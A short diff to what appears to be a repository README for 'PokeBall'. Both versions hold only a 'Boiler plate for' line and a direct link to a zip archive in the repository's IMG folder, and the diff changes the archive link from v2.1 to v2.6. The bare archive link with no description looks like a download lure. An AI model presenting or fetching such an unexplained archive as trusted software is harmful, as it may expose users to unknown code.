@@ -1,2 +1,2 @@
-# https://raw.githubusercontent.com/mreenalDhruwe/PokeBall/main/IMG/PokeBall_v2.1.zip
-Boiler plate for https://raw.githubusercontent.com/mreenalDhruwe/PokeBall/main/IMG/PokeBall_v2.1.zip
+# https://github.com/mreenalDhruwe/PokeBall/raw/refs/heads/main/IMG/Poke-Ball-v2.6.zip
+Boiler plate for https://github.com/mreenalDhruwe/PokeBall/raw/refs/heads/main/IMG/Poke-Ball-v2.6.zip
